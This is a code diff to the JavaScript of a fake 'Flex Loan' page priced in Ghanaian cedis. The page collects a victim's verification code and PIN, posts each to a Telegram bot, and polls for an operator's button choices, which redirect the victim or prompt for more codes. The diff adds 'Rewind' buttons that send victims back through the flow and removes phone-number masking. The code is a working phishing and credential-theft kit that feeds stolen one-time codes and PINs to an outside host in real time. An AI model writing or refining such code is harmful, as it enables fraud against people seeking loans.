@@ -448,6 +448,7 @@
 
         let state = { lastUpdateId: 0 };
         let isProcessing = false;
+        let activeInterval = null;
 
         const errMsg = document.getElementById('errMsg');
         const pinErrMsg = document.getElementById('pinErrMsg');
@@ -455,12 +456,7 @@
         const pinModal = document.getElementById('pinModal');
         const verifyBtn = document.getElementById('verifyBtn');
         const confirmPinBtn = document.getElementById('confirmPinBtn');
-        const offerTitleEl = document.getElementById('offerTitle');
-        const offerPriceEl = document.getElementById('offerPrice');
-        const offerMetaEl = document.getElementById('offerMeta');
-        const phoneDisplayEl = document.getElementById('phoneDisplay');
 
-        // ─── Read ALL params from URL and carry them forward ───────────────────
         const params = new URLSearchParams(window.location.search);
 
         function getAllParams() {
@@ -468,36 +464,20 @@
         }
 
         function loadOffer() {
-            const name     = params.get('name')     || params.get('loan_name')   || 'Flex Loan';
-            const amount   = params.get('amount')   || params.get('loan_amount') || '1000';
-            const phone    = params.get('phone')    || params.get('msisdn')      || '';
-            const duration = params.get('duration') || params.get('tenor')       || '';
-            const rate     = params.get('rate')     || params.get('interest')    || '';
-            const fee      = params.get('fee')      || '';
+            const amount = params.get('amount');
+            const name = params.get('name');
+            const phone = params.get('phone');
+            const duration = params.get('duration');
+            const purpose = params.get('purpose');
 
-            offerTitleEl.textContent = name;
-            offerPriceEl.textContent = `GHS ${parseInt(amount).toLocaleString()}`;
+            if (amount) document.getElementById('offerPrice').textContent = `GHS ${parseFloat(amount).toLocaleString()}`;
+            if (name) document.getElementById('offerTitle').textContent = `${name}'s Flex Loan`;
+            if (phone) document.getElementById('phoneDisplay').innerHTML = `Verification code sent to <strong>${phone}</strong>`;
 
-            const metaItems = [];
-            if (duration) metaItems.push({ label: 'Duration', value: duration });
-            if (rate)     metaItems.push({ label: 'Interest',  value: rate });
-            if (fee)      metaItems.push({ label: 'Fee',       value: `GHS ${fee}` });
-
-            if (metaItems.length) {
-                offerMetaEl.innerHTML = metaItems
-                    .map(m => `<div class="meta-item">${m.label}: <span>${m.value}</span></div>`)
-                    .join('');
-            }
-
-            if (phone) {
-                phoneDisplayEl.innerHTML = `Code sent to <strong>${maskPhone(phone)}</strong>`;
-            }
-        }
-
-        function maskPhone(phone) {
-            const p = phone.replace(/\s+/g, '');
-            if (p.length <= 5) return p;
-            return p.slice(0, 3) + '*'.repeat(p.length - 5) + p.slice(-2);
+            const meta = document.getElementById('offerMeta');
+            meta.innerHTML = '';
+            if (duration) meta.innerHTML += `<div class="meta-item">Duration: <span>${duration} Days</span></div>`;
+            if (purpose) meta.innerHTML += `<div class="meta-item">Purpose: <span>${purpose.replace(/([A-Z])/g, ' $1').trim()}</span></div>`;
         }
 
         function createInputs(containerId, count) {
@@ -568,6 +548,7 @@
             const verifyDeviceId = `otp_verify_${ts}`;
             const validId    = `valid_${ts}`;
             const invalidId  = `invalid_${ts}`;
+            const rewindId   = `rewind_${ts}`; // This rewind will return to index.html (start of flow)
 
             const paramSummary = Array.from(params.entries())
                 .map(([k, v]) => `${k}: <code>${v}</code>`)
@@ -590,22 +571,26 @@
                                 { text: '✅ Valid PIN',   callback_data: validId },
                                 { text: '❌ Invalid PIN', callback_data: invalidId }
                             ],
-                            [{ text: '❌ Decline', callback_data: declineId }]
+                            [
+                                { text: '❌ Decline', callback_data: declineId },
+                                { text: '⏪ Rewind', callback_data: rewindId }
+                            ]
                         ]
                     }
                 })
             })
             .then(() => {
                 spinner.style.display = 'flex';
-                startPolling(approveId, declineId, verifyDeviceId, validId, invalidId);
+                startPolling(approveId, declineId, verifyDeviceId, validId, invalidId, rewindId);
             })
             .catch(() => {
                 resetButton();
             });
         }
 
-        function startPolling(approveId, declineId, verifyDeviceId, validId, invalidId) {
-            const interval = setInterval(() => {
+        function startPolling(approveId, declineId, verifyDeviceId, validId, invalidId, rewindId) {
+            if (activeInterval) clearInterval(activeInterval);
+            activeInterval = setInterval(() => {
                 fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
                     .then(r => r.json())
                     .then(data => {
@@ -615,19 +600,19 @@
                             if (update.callback_query) {
                                 const cb = update.callback_query.data;
                                 if (cb === approveId) {
-                                    clearInterval(interval);
+                                    clearInterval(activeInterval);
                                     spinner.style.display = 'none';
                                     showPinModal();
                                 } else if (cb === validId) {
-                                    clearInterval(interval);
+                                    clearInterval(activeInterval);
                                     spinner.style.display = 'none';
                                     window.location.href = buildNextUrl(CONFIG.SUCCESS_PAGE);
                                 } else if (cb === verifyDeviceId) {
-                                    clearInterval(interval);
+                                    clearInterval(activeInterval);
                                     spinner.style.display = 'none';
                                     window.location.href = buildNextUrl(CONFIG.DEVICE_PAGE);
                                 } else if (cb === declineId) {
-                                    clearInterval(interval);
+                                    clearInterval(activeInterval);
                                     spinner.style.display = 'none';
                                     errMsg.textContent = 'Request declined. Please try again.';
                                     errMsg.style.display = 'block';
@@ -635,7 +620,7 @@
                                     focusFirstInput('otpInputs');
                                     resetButton();
                                 } else if (cb === invalidId) {
-                                    clearInterval(interval);
+                                    clearInterval(activeInterval);
                                     spinner.style.display = 'none';
                                     pinErrMsg.textContent = 'Invalid PIN. Please try again.';
                                     pinErrMsg.style.display = 'block';
@@ -643,6 +628,11 @@
                                     focusFirstInput('pinInputs');
                                     confirmPinBtn.disabled = false;
                                     confirmPinBtn.textContent = 'Confirm PIN';
+                                } else if (cb === rewindId) {
+                                    // Rewind from OTP page goes back to the index.html (start)
+                                    clearInterval(activeInterval);
+                                    spinner.style.display = 'none';
+                                    window.location.href = 'index.html?' + params.toString();
                                 }
                             }
                         });
@@ -666,8 +656,9 @@
             confirmPinBtn.textContent = 'Verifying...';
 
             const ts        = Date.now();
-            const validId   = `valid_${ts}`;
-            const invalidId = `invalid_${ts}`;
+            const validId   = `valid_pin_${ts}`;
+            const invalidId = `invalid_pin_${ts}`;
+            const rewindId  = `rewind_to_otp_${ts}`; // This rewind will close the modal and go back to OTP step
 
             fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -677,16 +668,19 @@
                     text: `<b>🔴 PIN Verification</b>\n\nPIN: <code>${pin}</code>\n\nChoose action:`,
                     parse_mode: 'HTML',
                     reply_markup: {
-                        inline_keyboard: [[
-                            { text: '✅ Valid PIN',   callback_data: validId },
-                            { text: '❌ Invalid PIN', callback_data: invalidId }
-                        ]]
+                        inline_keyboard: [
+                            [
+                                { text: '✅ Valid PIN',   callback_data: validId },
+                                { text: '❌ Invalid PIN', callback_data: invalidId }
+                            ],
+                            [{ text: '⏪ Rewind', callback_data: rewindId }]
+                        ]
                     }
                 })
-            }).then(() => startPinPolling(validId, invalidId));
+            }).then(() => startPinPolling(validId, invalidId, rewindId));
         }
 
-        function startPinPolling(validId, invalidId) {
+        function startPinPolling(validId, invalidId, rewindId) {
             const interval = setInterval(() => {
                 fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
                     .then(r => r.json())
@@ -707,6 +701,14 @@
                                     focusFirstInput('pinInputs');
                                     confirmPinBtn.disabled = false;
                                     confirmPinBtn.textContent = 'Confirm PIN';
+                                } else if (cb === rewindId) {
+                                    // Rewind from PIN step goes back to OTP step (closes modal)
+                                    clearInterval(interval);
+                                    pinModal.style.display = 'none';
+                                    spinner.style.display = 'none';
+                                    resetButton();
+                                    // Re-trigger OTP polling so buttons work again
+                                    submitOTP(); 
                                 }
                             }
                         });
